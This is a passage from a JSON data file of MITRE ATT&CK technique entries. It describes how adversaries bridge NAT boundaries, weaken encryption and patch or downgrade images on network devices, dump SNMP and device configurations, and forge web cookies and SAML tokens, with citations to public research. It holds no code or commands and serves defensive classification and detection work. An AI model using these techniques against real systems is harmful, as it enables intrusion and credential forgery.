persuasive and believable lures.</p>\n",
    "technique_references": [
      {
        "source_name": "TrendMictro Phishing",
        "url": "https://www.trendmicro.com/en_us/research/20/i/tricky-forms-of-phishing.html",
        "description": "Babon, P. (2020, September 3). Tricky 'Forms' of Phishing. Retrieved October 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "PCMag FakeLogin",
        "url": "https://www.pcmag.com/news/hackers-try-to-phish-united-nations-staffers-with-fake-login-pages",
        "description": "Kan, M. (2019, October 24). Hackers Try to Phish United Nations Staffers With Fake Login Pages. Retrieved October 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Anti Spoofing",
        "url": "https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/anti-spoofing-protection?view=o365-worldwide",
        "description": "Microsoft. (2020, October 13). Anti-spoofing protection in EOP. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "ACSC Email Spoofing",
        "url": "https://www.cyber.gov.au/sites/default/files/2019-03/spoof_email_sender_policy_framework.pdf",
        "description": "Australian Cyber Security Centre. (2012, December). Mitigating Spoofed Emails Using Sender Policy Framework. Retrieved October 19, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--4ffc1794-ec3b-45be-9e52-42dbcb2af2de",
    "platform": "network",
    "tid": "T1599.001",
    "technique": "Network Address Translation Traversal",
    "tactic": "defense-evasion",
    "datasources": "netflow-enclave-netflow|packet-capture",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may bridge network boundaries by modifying a network device’s Network Address Translation (NAT) configuration. Malicious modifications to NAT may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.<!-- raw HTML omitted --><!-- raw HTML omitted -->Network devices such as routers and firewalls that connect multiple networks together may implement NAT during the process of passing packets between networks. When performing NAT, the network device will rewrite the source and/or destination addresses of the IP address header. Some network designs require NAT for the packets to cross the border device.  A typical example of this is environments where internal networks make use of non-Internet routable addresses.(Citation: RFC1918)<!-- raw HTML omitted --><!-- raw HTML omitted -->When an adversary gains control of a network boundary device, they can either leverage existing NAT configurations to send traffic between two separated networks, or they can implement NAT configurations of their own design.  In the case of network designs that require NAT to function, this enables the adversary to overcome inherent routing limitations that would normally prevent them from accessing protected systems behind the border device.  In the case of network designs that do not require NAT, address translation can be used by adversaries to obscure their activities, as changing the addresses of packets that traverse a network boundary device can make monitoring data transmissions more challenging for defenders.  <!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may use <a href=\"https://attack.mitre.org/techniques/T1601/001\">Patch System Image</a> to change the operating system of a network device, implementing their own custom NAT mechanisms to further obscure their activities</p>\n",
    "technique_references": [
      {
        "source_name": "RFC1918",
        "url": "https://tools.ietf.org/html/rfc1918",
        "description": "IETF Network Working Group. (1996, February). Address Allocation for Private Internets. Retrieved October 20, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--3a40f208-a9c1-4efa-a598-4003c3681fb8",
    "platform": "network",
    "tid": "T1600.001",
    "technique": "Reduce Key Space",
    "tactic": "defense-evasion",
    "datasources": "file-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may reduce the level of effort required to decrypt data transmitted over the network by reducing the cipher strength of encrypted communications.(Citation: Cisco Synful Knock Evolution)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries can weaken the encryption software on a compromised network device by reducing the key size used by the software to convert plaintext to ciphertext (e.g., from hundreds or thousands of bytes to just a couple of bytes). As a result, adversaries dramatically reduce the amount of effort needed to decrypt the protected information without the key.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may modify the key size used and other encryption parameters using specialized commands in a <a href=\"https://attack.mitre.org/techniques/T1059/008\">Network Device CLI</a> introduced to the system through <a href=\"https://attack.mitre.org/techniques/T1601\">Modify System Image</a> to change the configuration of the device. (Citation: Cisco Blog Legacy Device Attacks)</p>\n",
    "technique_references": [
      {
        "source_name": "Cisco Synful Knock Evolution",
        "url": "https://blogs.cisco.com/security/evolution-of-attacks-on-cisco-ios-devices",
        "description": "Graham Holmes. (2015, October 8). Evolution of attacks on Cisco IOS devices. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco Blog Legacy Device Attacks",
        "url": "https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954",
        "description": "Omar Santos. (2020, October 19). Attackers Continue to Target Legacy Devices. Retrieved October 20, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--7efba77e-3bc4-4ca5-8292-d8201dcd64b5",
    "platform": "network",
    "tid": "T1600.002",
    "technique": "Disable Crypto Hardware",
    "tactic": "defense-evasion",
    "datasources": "file-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries disable a network device’s dedicated hardware encryption, which may enable them to leverage weaknesses in software encryption in order to reduce the effort involved in collecting, manipulating, and exfiltrating transmitted data.<!-- raw HTML omitted --><!-- raw HTML omitted -->Many network devices such as routers, switches, and firewalls, perform encryption on network traffic to secure transmission across networks. Often, these devices are equipped with special, dedicated encryption hardware to greatly increase the speed of the encryption process as well as to prevent malicious tampering. When an adversary takes control of such a device, they may disable the dedicated hardware, for example, through use of <a href=\"https://attack.mitre.org/techniques/T1601\">Modify System Image</a>, forcing the use of software to perform encryption on general processors. This is typically used in conjunction with attacks to weaken the strength of the cipher in software (e.g., <a href=\"https://attack.mitre.org/techniques/T1600/001\">Reduce Key Space</a>). (Citation: Cisco Blog Legacy Device Attacks)</p>\n",
    "technique_references": [
      {
        "source_name": "Cisco Blog Legacy Device Attacks",
        "url": "https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954",
        "description": "Omar Santos. (2020, October 19). Attackers Continue to Target Legacy Devices. Retrieved October 20, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--d245808a-7086-4310-984a-a84aaaa43f8f",
    "platform": "network",
    "tid": "T1601.001",
    "technique": "Patch System Image",
    "tactic": "defense-evasion",
    "datasources": "file-monitoring|network-device-configuration|network-device-run-time-memory",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may modify the operating system of a network device to introduce new capabilities or weaken existing defenses.(Citation: Killing the myth of Cisco IOS rootkits) (Citation: Killing IOS diversity myth) (Citation: Cisco IOS Shellcode) (Citation: Cisco IOS Forensics Developments) (Citation: Juniper Netscreen of the Dead) Some network devices are built with a monolithic architecture, where the entire operating system and most of the functionality of the device is contained within a single file.  Adversaries may change this file in storage, to be loaded in a future boot, or in memory during runtime.<!-- raw HTML omitted --><!-- raw HTML omitted -->To change the operating system in storage, the adversary will typically use the standard procedures available to device operators. This may involve downloading a new file via typical protocols used on network devices, such as TFTP, FTP, SCP, or a console connection.  The original file may be overwritten, or a new file may be written alongside of it and the device reconfigured to boot to the compromised image.<!-- raw HTML omitted --><!-- raw HTML omitted -->To change the operating system in memory, the adversary typically can use one of two methods. In the first, the adversary would make use of native debug commands in the original, unaltered running operating system that allow them to directly modify the relevant memory addresses containing the running operating system.  This method typically requires administrative level access to the device.<!-- raw HTML omitted --><!-- raw HTML omitted -->In the second method for changing the operating system in memory, the adversary would make use of the boot loader. The boot loader is the first piece of software that loads when the device starts that, in turn, will launch the operating system.  Adversaries may use malicious code previously implanted in the boot loader, such as through the <a href=\"https://attack.mitre.org/techniques/T1542/004\">ROMMONkit</a> method, to directly manipulate running operating system code in memory.  This malicious code in the bootloader provides the capability of direct memory manipulation to the adversary, allowing them to patch the live operating system during runtime.<!-- raw HTML omitted --><!-- raw HTML omitted -->By modifying the instructions stored in the system image file, adversaries may either weaken existing defenses or provision new capabilities that the device did not have before. Examples of existing defenses that can be impeded include encryption, via <a href=\"https://attack.mitre.org/techniques/T1600\">Weaken Encryption</a>, authentication, via <a href=\"https://attack.mitre.org/techniques/T1556/004\">Network Device Authentication</a>, and perimeter defenses, via <a href=\"https://attack.mitre.org/techniques/T1599\">Network Boundary Bridging</a>.  Adding new capabilities for the adversary’s purpose include <a href=\"https://attack.mitre.org/techniques/T1056/001\">Keylogging</a>, <a href=\"https://attack.mitre.org/techniques/T1090/003\">Multi-hop Proxy</a>, and <a href=\"https://attack.mitre.org/techniques/T1205/001\">Port Knocking</a>.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may also compromise existing commands in the operating system to produce false output to mislead defenders.   When this method is used in conjunction with <a href=\"https://attack.mitre.org/techniques/T1601/002\">Downgrade System Image</a>, one example of a compromised system command may include changing the output of the command that shows the version of the currently running operating system.  By patching the operating system, the adversary can change this command to instead display the original, higher revision number that they replaced through the system downgrade. <!-- raw HTML omitted --><!-- raw HTML omitted -->When the operating system is patched in storage, this can be achieved in either the resident storage (typically a form of flash memory, which is non-volatile) or via <a href=\"https://attack.mitre.org/techniques/T1542/005\">TFTP Boot</a>. <!-- raw HTML omitted --><!-- raw HTML omitted -->When the technique is performed on the running operating system in memory and not on the stored copy, this technique will not survive across reboots.  However, live memory modification of the operating system can be combined with <a href=\"https://attack.mitre.org/techniques/T1542/004\">ROMMONkit</a> to achieve persistence.</p>\n",
    "technique_references": [
      {
        "source_name": "Killing the myth of Cisco IOS rootkits",
        "url": "https://drwho.virtadpt.net/images/killing_the_myth_of_cisco_ios_rootkits.pdf",
        "description": "Sebastian 'topo' Muñiz. (2008, May). Killing the myth of Cisco IOS rootkits. Retrieved October 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Killing IOS diversity myth",
        "url": "https://www.usenix.org/legacy/event/woot/tech/final_files/Cui.pdf",
        "description": "Ang Cui, Jatin Kataria, Salvatore J. Stolfo. (2011, August). Killing the myth of Cisco IOS diversity: recent advances in reliable shellcode design. Retrieved October 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco IOS Shellcode",
        "url": "http://2015.zeronights.org/assets/files/05-Nosenko.pdf",
        "description": "George Nosenko. (2015). CISCO IOS SHELLCODE: ALL-IN-ONE. Retrieved October 21, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco IOS Forensics Developments",
        "url": "https://www.recurity-labs.com/research/RecurityLabs_Developments_in_IOS_Forensics.pdf",
        "description": "Felix 'FX' Lindner. (2008, February). Developments in Cisco IOS Forensics. Retrieved October 21, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Juniper Netscreen of the Dead",
        "url": "https://www.blackhat.com/presentations/bh-usa-09/NEILSON/BHUSA09-Neilson-NetscreenDead-SLIDES.pdf",
        "description": "Graeme Neilson . (2009, August). Juniper Netscreen of the Dead. Retrieved October 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco IOS Software Integrity Assurance - Image File Verification",
        "url": "https://tools.cisco.com/security/center/resources/integrity_assurance.html#7",
        "description": "Cisco. (n.d.). Cisco IOS Software Integrity Assurance - Cisco IOS Image File Verification. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco IOS Software Integrity Assurance - Run-Time Memory Verification",
        "url": "https://tools.cisco.com/security/center/resources/integrity_assurance.html#13",
        "description": "Cisco. (n.d.). Cisco IOS Software Integrity Assurance - Cisco IOS Run-Time Memory Integrity Verification. Retrieved October 19, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--fc74ba38-dc98-461f-8611-b3dbf9978e3d",
    "platform": "network",
    "tid": "T1601.002",
    "technique": "Downgrade System Image",
    "tactic": "defense-evasion",
    "datasources": "file-monitoring|network-device-configuration",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may install an older version of the operating system of a network device to weaken security.  Older operating system versions on network devices often have weaker encryption ciphers and, in general, fewer/less updated defensive features. (Citation: Cisco Synful Knock Evolution)<!-- raw HTML omitted --><!-- raw HTML omitted -->On embedded devices, downgrading the version typically only requires replacing the operating system file in storage.  With most embedded devices, this can be achieved by downloading a copy of the desired version of the operating system file and reconfiguring the device to boot from that file on next system restart.  The adversary could then restart the device to implement the change immediately or they could wait until the next time the system restarts.<!-- raw HTML omitted --><!-- raw HTML omitted -->Downgrading the system image to an older versions may allow an adversary to evade defenses by enabling behaviors such as <a href=\"https://attack.mitre.org/techniques/T1600\">Weaken Encryption</a>.  Downgrading of a system image can be done on its own, or it can be used in conjunction with <a href=\"https://attack.mitre.org/techniques/T1601/001\">Patch System Image</a>.</p>\n",
    "technique_references": [
      {
        "source_name": "Cisco Synful Knock Evolution",
        "url": "https://blogs.cisco.com/security/evolution-of-attacks-on-cisco-ios-devices",
        "description": "Graham Holmes. (2015, October 8). Evolution of attacks on Cisco IOS devices. Retrieved October 19, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--ee7ff928-801c-4f34-8a99-3df965e581a5",
    "platform": "network",
    "tid": "T1602.001",
    "technique": "SNMP (MIB Dump)",
    "tactic": "collection",
    "datasources": "netflow-enclave-netflow|network-protocol-analysis|packet-capture",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may target the Management Information Base (MIB) to collect and/or mine valuable information in a network managed using Simple Network Management Protocol (SNMP).<!-- raw HTML omitted --><!-- raw HTML omitted -->The MIB is a configuration repository that stores variable information accessible via SNMP in the form of object identifiers (OID). Each OID identifies a variable that can be read or set and permits active management tasks, such as configuration changes, through remote modification of these variables. SNMP can give administrators great insight in their systems, such as, system information, description of hardware, physical location, and software packages(Citation: SANS Information Security Reading Room Securing SNMP Securing SNMP). The MIB may also contain device operational information, including running configuration, routing table, and interface details.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may use SNMP queries to collect MIB content directly from SNMP-managed devices in order to collect network information that allows the adversary to build network maps and facilitate future targeted exploitation.(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks)</p>\n",
    "technique_references": [
      {
        "source_name": "SANS Information Security Reading Room Securing SNMP Securing SNMP",
        "url": "https://www.sans.org/reading-room/whitepapers/networkdevs/securing-snmp-net-snmp-snmpv3-1051",
        "description": "Michael Stump. (2003). Information Security Reading Room Securing SNMP: A Look atNet-SNMP (SNMPv3). Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "US-CERT-TA18-106A",
        "url": "https://www.us-cert.gov/ncas/alerts/TA18-106A",
        "description": "US-CERT. (2018, April 20). Alert (TA18-106A) Russian State-Sponsored Cyber Actors Targeting Network Infrastructure Devices. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco Blog Legacy Device Attacks",
        "url": "https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954",
        "description": "Omar Santos. (2020, October 19). Attackers Continue to Target Legacy Devices. Retrieved October 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco Advisory SNMP v3 Authentication Vulnerabilities",
        "url": "https://tools.cisco.com/security/center/content/CiscoAppliedMitigationBulletin/cisco-amb-20080610-SNMPv3",
        "description": "Cisco. (2008, June 10). Identifying and Mitigating Exploitation of the SNMP Version 3 Authentication Vulnerabilities. Retrieved October 19, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--52759bf1-fe12-4052-ace6-c5b0cf7dd7fd",
    "platform": "network",
    "tid": "T1602.002",
    "technique": "Network Device Configuration Dump",
    "tactic": "collection",
    "datasources": "netflow-enclave-netflow|network-protocol-analysis|packet-capture",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may access network configuration files to collect sensitive data about the device and the network. The network configuration is a file containing parameters that determine the operation of the device. The device typically stores an in-memory copy of the configuration while operating, and a separate configuration on non-volatile storage to load after device reset. Adversaries can inspect the configuration files to reveal information about the target network and its layout, the network device and its software, or identifying legitimate accounts and credentials for later use.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries can use common management tools and protocols, such as Simple Network Management Protocol (SNMP) and Smart Install (SMI), to access network configuration files. (Citation: US-CERT TA18-106A Network Infrastructure Devices 2018) (Citation: Cisco Blog Legacy Device Attacks) These tools may be used to query specific data from a configuration repository or configure the device to export the configuration for later analysis.</p>\n",
    "technique_references": [
      {
        "source_name": "US-CERT TA18-106A Network Infrastructure Devices 2018",
        "url": "https://us-cert.cisa.gov/ncas/alerts/TA18-106A",
        "description": "US-CERT. (2018, April 20). Russian State-Sponsored Cyber Actors Targeting Network Infrastructure Devices. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco Blog Legacy Device Attacks",
        "url": "https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954",
        "description": "Omar Santos. (2020, October 19). Attackers Continue to Target Legacy Devices. Retrieved October 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "US-CERT TA18-068A 2018",
        "url": "https://www.us-cert.gov/ncas/alerts/TA18-086A",
        "description": "US-CERT. (2018, March 27). TA18-068A Brute Force Attacks Conducted by Cyber Actors. Retrieved October 2, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--861b8fd2-57f3-4ee1-ab5d-c19c3b8c7a4a",
    "platform": "linux|macos|windows|saas",
    "tid": "T1606.001",
    "technique": "Web Cookies",
    "tactic": "credential-access",
    "datasources": "authentication-logs|web-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may forge web cookies that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies to authenticate and authorize user access.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may generate these cookies in order to gain access to web resources. This differs from <a href=\"https://attack.mitre.org/techniques/T1539\">Steal Web Session Cookie</a> and other similar behaviors in that the cookies are new and forged by the adversary, rather than stolen or intercepted from legitimate users. Most common web applications have standardized and documented cookie values that can be generated using provided tools or interfaces.(Citation: Pass The Cookie) The generation of web cookies often requires secret values, such as passwords, <a href=\"https://attack.mitre.org/techniques/T1552/004\">Private Keys</a>, or other cryptographic seed values.<!-- raw HTML omitted --><!-- raw HTML omitted -->Once forged, adversaries may use these web cookies to access resources (<a href=\"https://attack.mitre.org/techniques/T1550/004\">Web Session Cookie</a>), which may bypass multi-factor and other authentication protection mechanisms.(Citation: Volexity SolarWinds)(Citation: Pass The Cookie)(Citation: Unit 42 Mac Crypto Cookies January 2019)</p>\n",
    "technique_references": [
      {
        "source_name": "Pass The Cookie",
        "url": "https://wunderwuzzi23.github.io/blog/passthecookie.html",
        "description": "Rehberger, J. (2018, December). Pivot to the Cloud using Pass the Cookie. Retrieved April 5, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Volexity SolarWinds",
        "url": "https://www.volexity.com/blog/2020/12/14/dark-halo-leverages-solarwinds-compromise-to-breach-organizations/",
        "description": "Cash, D. et al. (2020, December 14). Dark Halo Leverages SolarWinds Compromise to Breach Organizations. Retrieved December 29, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Unit 42 Mac Crypto Cookies January 2019",
        "url": "https://unit42.paloaltonetworks.com/mac-malware-steals-cryptocurrency-exchanges-cookies/",
        "description": "Chen, Y., Hu, W., Xu, Z., et. al. (2019, January 31). Mac Malware Steals Cryptocurrency Exchanges’ Cookies. Retrieved October 14, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--1f9c2bae-b441-4f66-a8af-b65946ee72f2",
    "platform": "azure-ad|saas|windows|office-365",
    "tid": "T1606.002",
    "technique": "SAML Tokens",
    "tactic": "credential-access",
    "datasources": "authentication-logs|windows-event-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>An adversary may forge SAML tokens with any permissions claims and lifetimes if they possess a valid SAML token-signing certificate.(Citation: Microsoft SolarWinds Steps) The default lifetime of a SAML token is one hour, but the validity period can be specified in the <!-- raw HTML omitted -->NotOnOrAfter<!-- raw HTML omitted --> value of the <!-- raw HTML omitted -->conditions …<!-- raw HTML omitted --> element in a token. This value can be changed using the <!-- raw HTML omitted -->AccessTokenLifetime<!-- raw HTML omitted --> in a <!-- raw HTML omitted -->LifetimeTokenPolicy<!-- raw HTML omitted -->.(Citation: Microsoft SAML Token Lifetimes) Forged SAML tokens enable adversaries to authenticate across services that use SAML 2.0 as an SSO (single sign-on) mechanism.(Citation: Cyberark Golden SAML)<!-- raw HTML omitted --><!-- raw HTML omitted -->An adversary may utilize <a href=\"https://attack.mitre.org/techniques/T1552/004\">Private Keys</a> to compromise an organization’s token-signing certificate to create forged SAML tokens. If the adversary has sufficient permissions to establish a new federation trust with their own Active Directory Federation Services (AD FS) server, they may instead generate their own trusted token-signing certificate.(Citation: Microsoft SolarWinds Customer Guidance) This differs from <a href=\"https://attack.mitre.org/techniques/T1528\">Steal Application Access Token</a> and other similar behaviors in that the tokens are new and forged by the adversary, rather than stolen or intercepted from legitimate users.<!-- raw HTML omitted --><!-- raw HTML omitted -->An adversary may gain administrative Azure AD privileges if a SAML token is forged which claims to represent a highly privileged account. This may lead to <a href=\"https://attack.mitre.org/techniques/T1550\">Use Alternate Authentication Material</a>, which may bypass multi-factor and other authentication protection mechanisms.(Citation: Microsoft SolarWinds Customer Guidance)</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft SolarWinds Steps",
        "url": "https://blogs.microsoft.com/on-the-issues/2020/12/13/customers-protect-nation-state-cyberattacks/",
        "description": "Lambert, J. (2020, December 13). Important steps for customers to protect themselves from recent nation-state cyberattacks. Retrieved December 17, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft SAML Token Lifetimes",
        "url": "https://docs.microsoft.com/en-us/azure/active-directory/develop/active-directory-configurable-token-lifetimes",
        "description": "Microsoft. (2020, December 14). Configurable token lifetimes in Microsoft Identity Platform. Retrieved December 22, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Cyberark Golden SAML",
        "url": "https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps",
        "description": "Reiner, S. (2017, November 21). Golden SAML: Newly Discovered Attack Technique Forges Authentication to Cloud Apps. Retrieved December 17, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft SolarWinds Customer Guidance",
        "url": "https://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/",
        "description": "MSRC. (2020, December 13). Customer Guidance on Recent Nation-State Cyber Attacks. Retrieved December 17, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Sygnia Golden SAML",
        "url": "https://www.sygnia.co/golden-saml-advisory",
        "description": "Sygnia. (2020, December). Detection and Hunting of Golden SAML Attack. Retrieved January 6, 2021.",
        "external_id": "none"
      }
    ]
  }
]
